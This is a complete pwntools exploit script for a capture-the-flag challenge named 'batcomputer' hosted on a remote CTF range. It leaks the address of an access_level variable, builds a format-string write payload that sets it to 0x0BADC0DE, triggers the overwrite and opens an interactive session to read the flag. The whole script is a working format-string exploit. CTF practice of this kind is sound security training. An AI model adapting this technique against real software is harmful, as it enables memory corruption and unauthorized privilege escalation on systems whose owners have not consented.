from pwn import *

context.binary = elf = ELF("./batcomputer", checksec=False)
context.log_level = "info"

HOST = "ctf.neocyberrange.com"
PORT = 9001
OFFSET = 6            # <-- replace if yours differs
TARGET = 0x0BADC0DE

p = remote(HOST, PORT)

# -------------------------
# Leak access_level address
# -------------------------
p.sendlineafter(b"Enter command:", b"2")
p.recvuntil(b"access_level address: ")
access_addr = int(p.recvline().strip(), 16)

log.success(f"access_level @ {hex(access_addr)}")

# -------------------------
# Build payload
# -------------------------
payload = fmtstr_payload(
    OFFSET,
    {access_addr: TARGET},
    write_size="short"
)

# -------------------------
# Trigger overwrite
# -------------------------
p.sendlineafter(b"Enter command:", b"1")
p.sendlineafter(b"Event description:", payload)

# -------------------------
# Get flag
# -------------------------
p.sendlineafter(b"Enter command:", b"3")
p.interactive()

